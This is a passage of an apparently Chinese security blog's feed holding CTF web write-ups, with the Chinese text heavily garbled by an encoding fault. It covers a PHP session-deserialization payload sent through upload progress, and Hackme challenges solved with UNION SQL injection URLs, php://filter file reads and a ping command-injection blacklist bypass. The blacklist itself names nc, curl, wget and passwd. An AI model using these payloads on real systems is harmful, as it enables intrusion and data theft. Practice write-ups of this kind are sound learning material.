|ï¼ˆç«–çº¿ï¼‰ï¼Œç”¨ç«–çº¿å°†å­—ç¬¦ä¸²åˆ†å‰²æˆâ€é”®åâ€å’Œâ€œé”®å€¼â€ï¼Œ å¹¶å¯¹â€œé”®å€¼â€è¿›è¡Œååºåˆ—åŒ–ã€‚ä½†å¦‚æœè¿™æ¬¡ååºåˆ—åŒ–å¤±è´¥ï¼Œå°±æ”¾å¼ƒè¿™æ¬¡è§£æï¼Œå†å»æ‰¾ä¸‹ä¸€ä¸ªç«–çº¿ï¼Œæ‰§è¡ŒåŒæ ·çš„æ“ä½œï¼Œç›´åˆ°æˆåŠŸã€‚</p></blockquote><p>ç„¶è€Œåˆ°è¿™é‡Œè¿˜æ˜¯æ²¡è§£å†³ <code>mdzz</code> ä¸å¯æ§çš„é—®é¢˜ï¼Œæ¥ä¸‹æ¥å¼•å…¥ç¬¬äºŒä¸ªçŸ¥è¯†ç‚¹ã€‚</p><p><strong>2.ä¸Šä¼ è¿›åº¦æ”¯æŒï¼ˆUpload progress in sessionsï¼‰</strong></p><p>æ­£å¸¸ç”¨æ³•å‚è§ <a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">example #1</a>ï¼Œé…åˆ Ajax å°±èƒ½æ˜¾ç¤ºä¸Šä¼ è¿›åº¦ã€‚</p><p>åˆ©ç”¨æ­¤æ³•å¯è¾¾åˆ°å¯¹ <code>session</code> å†™å…¥æ•°æ®çš„æ•ˆæœï¼Œä»è€Œä½¿å¾— <code>$mdzz</code> å¯æ§ï¼Œå¯å‚ç…§ <a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">æœ‰è¶£çš„ php ååºåˆ—åŒ–æ€»ç»“</a></p><blockquote><p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶ post ä¸€ä¸ªä¸ ini è®¾ç½®çš„ session.upload_progress.name åŒåå˜é‡æ—¶ï¼Œphp æ£€æµ‹åˆ°è¿™ç§ post è¯·æ±‚æ—¶å°±ä¼šåœ¨ $_SESSION ä¸­æ·»åŠ ä¸€ç»„æ•°æ®ï¼Œæ‰€ä»¥å¯é€šè¿‡ session.upload_progress æ¥è®¾ç½® <code>session</code>ã€‚</p></blockquote><p>ä¸‹é¢æ˜¯éƒ¨åˆ†å‚æ•°è¯´æ˜</p><blockquote><p>session.upload_progress.enabled[=1] : æ˜¯å¦å¯ç”¨ä¸Šä¼ è¿›åº¦æŠ¥å‘Š(é»˜è®¤å¼€å¯)<br>session.upload_progress.cleanup[=1] : æ˜¯å¦åœ¨ä¸Šä¼ å®ŒæˆååŠæ—¶åˆ é™¤è¿›åº¦æ•°æ®(é»˜è®¤å¼€å¯, æ¨èå¼€å¯).<br>session.upload_progress.prefix[=upload_progress_] : è¿›åº¦æ•°æ®å°†å­˜å‚¨åœ¨<br>_SESSION[session.upload_progress.prefix . _POST[session.upload_progress.name]]<br>session.upload_progress.name[=PHP_SESSION_UPLOAD_PROGRESS] :<br>å¦‚æœ _POST[session.upload_progress.name]æ²¡æœ‰è¢«è®¾ç½®, åˆ™ä¸ä¼šæŠ¥å‘Šè¿›åº¦.<br>session.upload_progress.freq[=1%] : æ›´æ–°è¿›åº¦çš„é¢‘ç‡(å·²ç»å¤„ç†çš„å­—èŠ‚æ•°), ä¹Ÿæ”¯æŒç™¾åˆ†æ¯”è¡¨ç¤ºâ€™%â€™.<br>session.upload_progress.min_freq[=1.0] : æ›´æ–°è¿›åº¦çš„æ—¶é—´é—´éš”(ç§’çº§)</p></blockquote><p>å›åˆ°æœ¬é¢˜ï¼ŒæŸ¥çœ‹ <code>phpinfo</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.enabled</span> = <span class="number">1</span></span><br><span class="line">session<span class="selector-class">.upload_progress</span><span class="selector-class">.cleanup</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>å³ä½¿ cleanup å¼€å¯äº†ä¹Ÿé—®é¢˜ä¸å¤§ï¼Œå¯åˆ©ç”¨æŒç»­ä¸Šä¼ è¿›è¡Œæ¡ä»¶ç«äº‰ã€‚</p><h3 id="å¼€å¹²"><a href="#å¼€å¹²" class="headerlink" title="å¼€å¹²"></a>å¼€å¹²</h3><p><strong>æ„é€ ä¸€ä¸ªè¡¨å•</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"2333"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœä¸æŒ‡å®šï¼ŒPHP å°†é»˜è®¤ä½¿ç”¨ â€œphpâ€œ ä½œä¸º session åºåˆ—åŒ–çš„æ–¹æ³•ï¼Œpayload åŠç»“æœå¦‚ä¸‹ï¼š</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g5usdf3ce7j20z00h7429.jpg" alt></p><p>PSï¼šä¸ç”¨çº ç»“ <code>Content-Type</code>ï¼Œè¿™ä¸ªå¯¹è§£é¢˜æ²¡æœ‰å½±å“ï¼Œé‡ç‚¹æ˜¯åŠ å…¥<code>\</code>ï¼Œé˜²æ­¢ <code>&quot;</code> è¢«è½¬ä¹‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:19:\"print_r($_SESSION);\";&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span> (</span><br><span class="line">[a:<span class="number">1</span>:&#123;s:<span class="number">24</span>:<span class="string">"upload_progress_12312131"</span>;a:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">"start_time"</span>;i:<span class="number">1551019950</span>;s:<span class="number">14</span>:<span class="string">"content_length"</span>;i:<span class="number">434</span>;s:<span class="number">15</span>:<span class="string">"bytes_processed"</span>;i:<span class="number">434</span>;s:<span class="number">4</span>:<span class="string">"done"</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"files"</span>;</span><br><span class="line"> a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">"field_name"</span>;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">55</span>:<span class="string">"] </span></span><br><span class="line"><span class="string">=&gt; OowoO Object(</span></span><br><span class="line"><span class="string">[mdzz] =&gt; print_r($_SESSION);</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">)</span></span><br></pre></td></tr></table></figure><p>æ ¹æ® php æ‰‹å†Œï¼Œå­˜å…¥ <code>session</code> é‡Œçš„å½¢å¼æ˜¯è¿™æ ·çš„ï¼Œç”±æ­¤çœ‹å‡º <code>field_name</code> ä¹Ÿå¯ï¼Œæ‰€ä»¥ä¸ä¸€å®šè¦ç”¨ <code>filename</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">"upload_progress_123"</span>] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time</span></span><br><span class="line"><span class="string">"content_length"</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length</span></span><br><span class="line"><span class="string">"bytes_processed"</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed</span></span><br><span class="line"><span class="string">"done"</span> =&gt; <span class="keyword">false</span>,              </span><br><span class="line">    <span class="comment">// true when the POST handler has finished, successfully or not</span></span><br><span class="line"><span class="string">"files"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"field_name"</span> =&gt; <span class="string">"file1"</span>,       <span class="comment">// Name of the &lt;input/&gt; field</span></span><br><span class="line"><span class="comment">// The following 3 elements equals those in $_FILES</span></span><br><span class="line"><span class="string">"name"</span> =&gt; <span class="string">"foo.avi"</span>,</span><br><span class="line"><span class="string">"tmp_name"</span> =&gt; <span class="string">"/tmp/phpxxxxxx"</span>,</span><br><span class="line"><span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="string">"done"</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">            <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line"><span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>, </span><br><span class="line">            <span class="comment">// When this file has started to be processed</span></span><br><span class="line"><span class="string">"bytes_processed"</span> =&gt; <span class="number">57343250</span>, </span><br><span class="line">            <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>æ‹¿ <code>flag</code> çš„è€å¥—è·¯å°±ä¸å¤šè¯´äº†ï¼ŒæŠŠ <code>mdzz</code> é‡Œçš„å€¼æ¢æˆä½ éœ€è¦æ‰§è¡Œçš„æ“ä½œå³å¯ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><blockquote><p>çŸ¥è¯†é¢ï¼Œå†³å®šçœ‹åˆ°çš„æ”»å‡»é¢æœ‰å¤šå¹¿ã€‚</p><p>çŸ¥è¯†é“¾ï¼Œå†³å®šå‘åŠ¨çš„æ€ä¼¤é“¾æœ‰å¤šæ·±ã€‚</p></blockquote><p> â€”â€”çŒªçŒªä¾ </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ä»-session-è§’åº¦å­¦ä¹ ååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#ä»-session-è§’åº¦å­¦ä¹ ååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;ä» session è§’åº¦å­¦ä¹ ååºåˆ—åŒ–&quot;&gt;&lt;/a&gt;ä» session è§’åº¦å­¦ä¹ ååºåˆ—åŒ–&lt;/h1&gt;&lt;p&gt;ä¸‹é¢æ˜¯é¢˜ç›®ç»™
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="ååºåˆ—åŒ–" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Hackme-Web-Writeup</title>
    <link href="https://wywwzjj.top/2019/02/02/Hackme-Writeup/"/>
    <id>https://wywwzjj.top/2019/02/02/Hackme-Writeup/</id>
    <published>2019-02-02T15:23:33.000Z</published>
    <updated>2019-05-23T03:03:58.290Z</updated>
    
    <content type="html"><![CDATA[<h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a><a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">hide and seek</a></h2><blockquote><p>Can you see me? Iâ€™m so close to you but you canâ€™t see me.</p></blockquote><p>è¿™é¢˜æŸ¥çœ‹æºç å³å¯ã€‚</p><h2 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb" target="_blank" rel="noopener">guestbook</a></h2><blockquote><p>This guestbook sucks. <a href="http://sqlmap.org/" target="_blank" rel="noopener">sqlmap</a> is your friend. </p></blockquote><p>æ—¢ç„¶æç¤ºæœ‰ <code>sqlmap</code> ï¼Œæˆ–è®¸å¯ä»¥ä¸€æŠŠæ¢­ã€‚</p><p>å…ˆæ‰‹æ³¨ä¸€æ³¢è¯•è¯•ï¼Œå‘ç°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ã€‚</p><p>æœ‰å››ä¸ªå­—æ®µï¼Œçœ‹ä¸€ä¸‹<strong>æ˜¾ä½</strong>ã€‚</p><p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,4</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jrbl15e9j20ls0aijrx.jpg" alt></p><p>éƒ½æœ‰æ˜æ˜¾å›æ˜¾ï¼Œç›´æ¥ä¸Šå§ï¼Œç›²æ³¨å¤ªæ…¢ã€‚</p><p><strong>æ‹¿åˆ°åˆ—å</strong></p><p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jrl665y7j20ox0amq3k.jpg" alt></p><p><strong>æŸ¥è¯¢æ‰€æœ‰æ•°æ®</strong></p><p><a href="https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag" target="_blank" rel="noopener">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,3,group_concat(flag)%20from%20flag</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g2jvo2i9hmj20u50acaaw.jpg" alt></p><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a><a href="https://hackme.inndy.tw/lfi/" target="_blank" rel="noopener">LFI</a></h2><blockquote><p>What this adminâ€™s password? That is not important at all, just get the flag. Tips: LFI, <code>php://filter</code></p></blockquote><p>ç”¨åˆ° PHP ä¼ªåè®®ï¼š<code>php://filter</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=pages/login</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¾—åˆ° login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'user'</span>] === <span class="string">'admin'</span> &amp;&amp; md5($_POST[<span class="string">'pass'</span>]) === <span class="string">'bed128365216c019988915ed3add75fb'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"?page=pages/login"</span> method=<span class="string">"post"</span> role=<span class="string">"form"</span>&gt;</span><br><span class="line">&lt;div class="form-group"&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"user-i"</span>&gt;User&lt;/label&gt;</span><br><span class="line">&lt;input type="text" class="form-control" id="user-i" placeholder="Username" name="user"&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class="form-group"&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">"pass-i"</span>&gt;Password&lt;/label&gt;</span><br><span class="line">&lt;input type="password" class="form-control" id="pass-i" placeholder="Password" name="pass"&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;button type="submit" class="btn btn-primary"&gt;Login&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// å†çœ‹ä¸‹ config.phpï¼Œæ‹¿åˆ° flag</span></span><br><span class="line">$flag = <span class="string">"FLAG&#123;Yoooooo_xsXSYP......&#125;"</span>;</span><br></pre></td></tr></table></figure><h2 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a><a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">homepage</a></h2><blockquote><p>Where is the flag? Did you check the code? </p></blockquote><p>æç¤ºæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°äº†ä¸€ä¸ªç‰¹åˆ«çš„ <code>cute.js</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åšä»ãšï¿½ï¿½ï¿½ï¿½= <span class="regexp">/åššï¿½åššæ¦…æ¹›ï¿½ãšï¿½ï¿½ ~ï¿½ğ¤«‡ï¿½ï¿½ï¿½ğ¤«‡   /</span><span class="comment">/*ç¹”ï¿½ï¿½ï¿½ï¿½*/</span> [<span class="string">'_'</span>]; o=(åšï¿½è”‘åšï¿½)  =_=<span class="number">3</span>; c=(åšå·µçŸ‹ï¿½ï¿½) =(åšï¿½è”‘åšï¿½)-(åšï¿½è”‘åšï¿½); (åšæ°±äˆ‘ï¿½ï¿½) =(åšå·µçŸ‹ï¿½ï¿½)= (o^_^o)/ (o^_^o);(åšæ°±äˆ‘ï¿½ï¿½)=&#123;åšå·µçŸ‹ï¿½ï¿½: <span class="string">'_'</span> ,åšä»ãšï¿½ï¿½ï¿½ï¿½ : ((åšä»ãšï¿½ï¿½ï¿½ï¿½==<span class="number">3</span>) +<span class="string">'_'</span>) [åšå·µçŸ‹ï¿½ç¯ ,åšï¿½è”‘åšï¿½ï¿½ï¿½ :(åšä»ãšï¿½ï¿½ï¿½ï¿½+ <span class="string">'_'</span>)[o^_^o -(åšå·µçŸ‹ï¿½ï¿½)] ,åšæ°±äˆ‘ï¿½ï¿½ï¿½ï¿½:((åšï¿½è”‘åšï¿½==<span class="number">3</span>) +<span class="string">'_'</span>)[åšï¿½è”‘åšç¯ &#125;; (åšæ°±äˆ‘ï¿½ï¿½) [åšå·µçŸ‹ï¿½ç¯ =((åšä»ãšï¿½ï¿½ï¿½ï¿½==<span class="number">3</span>) +<span class="string">'_'</span>) [c^_^o];(åšæ°±äˆ‘ï¿½ï¿½) [<span class="string">'c'</span>] = ((åšæ°±äˆ‘ï¿½ï¿½)+<span class="string">'_'</span>) [ (åšï¿½è”‘åšï¿½)+(åšï¿½è”‘åšï¿½)-(åšå·µçŸ‹ï¿½ï¿½) ];(åšæ°±äˆ‘ï¿½ï¿½) [<span class="string">'o'</span>] = ((åšæ°±äˆ‘ï¿½ï¿½)+<span class="string">'_'</span>) [åšå·µçŸ‹ï¿½ç¯;(åšå‰ åšï¿½)=(åšæ°±äˆ‘ï¿½ï¿½) [<span class="string">'c'</span>]+(åšæ°±äˆ‘ï¿½ï¿½) [<span class="string">'o'</span>]+(åšä»ãšï¿½ï¿½ï¿½ï¿½ +<span class="string">'_'</span>)[åšå·µçŸ‹ï¿½ç¯+ ((åšä»ãšï¿½ï¿½ï¿½ï¿½==<span class="number">3</span>) +<span class="string">'_'</span>) [åšï¿½è”‘åšç¯ + ((åšæ°±.......</span><br></pre></td></tr></table></figure><p>åˆ«çš„å¸ˆå‚…è¯´æ˜¯ <code>aaencode</code> åŠ å¯†ï¼Œæˆ‘æœ‰ç‚¹æ‡µé€¼ï¼Œä»¥åå†å¼„å§ï¼Œè¿™ç§é¢˜ä¸å€¼å¾—å¤šèŠ±æ—¶é—´ã€‚</p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a><a href="https://hackme.inndy.tw/ping/" target="_blank" rel="noopener">ping</a></h2><blockquote><p>Can you ping 127.0.0.1?</p></blockquote><p>çœ‹æ¥æ˜¯æºç å®¡è®¡çš„é¢˜ç›®ï¼Œå‘½ä»¤æ³¨å…¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Ping&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;.&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">        IP: &lt;input type=&quot;text&quot; name=&quot;ip&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Ping&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;pre&gt;&lt;?php</span><br><span class="line">        $blacklist = [</span><br><span class="line">            &apos;flag&apos;, &apos;cat&apos;, &apos;nc&apos;, &apos;sh&apos;, &apos;cp&apos;, &apos;touch&apos;, &apos;mv&apos;, &apos;rm&apos;, &apos;ps&apos;, &apos;top&apos;, &apos;sleep&apos;, &apos;sed&apos;,</span><br><span class="line">            &apos;apt&apos;, &apos;yum&apos;, &apos;curl&apos;, &apos;wget&apos;, &apos;perl&apos;, &apos;python&apos;, &apos;zip&apos;, &apos;tar&apos;, &apos;php&apos;, &apos;ruby&apos;, &apos;kill&apos;,</span><br><span class="line">            &apos;passwd&apos;, &apos;shadow&apos;, &apos;root&apos;,</span><br><span class="line">            &apos;z&apos;,</span><br><span class="line">            &apos;dir&apos;, &apos;dd&apos;, &apos;df&apos;, &apos;du&apos;, &apos;free&apos;, &apos;tempfile&apos;, &apos;touch&apos;, &apos;tee&apos;, &apos;sha&apos;, &apos;x64&apos;, &apos;g&apos;,</span><br><span class="line">            &apos;xargs&apos;, &apos;PATH&apos;,</span><br><span class="line">            &apos;$0&apos;, &apos;proc&apos;,</span><br><span class="line">            &apos;/&apos;, &apos;&amp;&apos;, &apos;|&apos;, &apos;&gt;&apos;, &apos;&lt;&apos;, &apos;;&apos;, &apos;&quot;&apos;, &apos;\&apos;&apos;, &apos;\\&apos;, &quot;\n&quot;</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        set_time_limit(2);</span><br><span class="line"></span><br><span class="line">        function ping($ip) &#123;</span><br><span class="line">            global $blacklist;</span><br><span class="line"></span><br><span class="line">            if(strlen($ip) &gt; 15) &#123;</span><br><span class="line">                return &apos;IP toooooo longgggggggggg&apos;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                foreach($blacklist as $keyword) &#123;</span><br><span class="line">                    if(strstr($ip, $keyword)) &#123;</span><br><span class="line">                        return &quot;&#123;$keyword&#125; not allowed&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $ret = [];</span><br><span class="line">                exec(&quot;ping -c 1 \&quot;&#123;$ip&#125;\&quot; 2&gt;&amp;1&quot;, $ret);</span><br><span class="line">                return implode(&quot;\n&quot;, array_slice($ret, 0, 10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_GET[&apos;ip&apos;]))</span><br><span class="line">            echo htmlentities(ping($_GET[&apos;ip&apos;]));</span><br><span class="line">        else</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">    ?&gt;&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å‘ç° <code>$</code> æ²¡æœ‰åœ¨é»‘åå•å†…ï¼Œè¿˜å¯ä»¥ ``</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(ls) / `ls`</span></span><br><span class="line">ping: flag.php </span><br><span class="line">index.php: Name or service not known</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat è¢«è¿‡æ»¤äº†ï¼Œä½†æœ‰ä¸€å †å¯ä»¥æŸ¥çœ‹æ–‡ä»¶å†…å®¹çš„å‘½ä»¤å•Š</span></span><br><span class="line">tac  ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„å€’ç€å†™ï¼ </span><br><span class="line">more ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹ </span><br><span class="line">less ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥å¾€å‰ç¿»é¡µï¼ </span><br><span class="line">head åªçœ‹å¤´å‡ è¡Œ </span><br><span class="line">tail åªçœ‹å°¾å·´å‡ è¡Œ </span><br><span class="line">nl   æ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºé“è¾“å‡ºè¡Œå·ï¼</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> åŠ ä¸ª * æ¨¡ç³ŠåŒ¹é…ä¸€ä¸‹</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(tac f*)</span></span><br><span class="line">ping: $flag = 'FLAG&#123;ping_$(capture-the-flag)_U.....&#125;';</span><br><span class="line">&lt;?php: Name or service not known</span><br></pre></td></tr></table></figure><h2 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a><a href="https://hackme.inndy.tw/scoreboard" target="_blank" rel="noopener">scoreboard</a></h2><blockquote><p><strong>DO NOT</strong> ATTACK or SCAN scoreboard, you donâ€™t need to do that.</p></blockquote><p><code>header</code> é‡Œå‘ç°äº† <code>x-flag</code>ã€‚</p><h2 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a><a href="https://hackme.inndy.tw/login0" target="_blank" rel="noopener">login as admin 0</a></h2><blockquote><p>SQL Injection!</p></blockquote><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç ï¼Œå¼€å§‹å®¡è®¡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 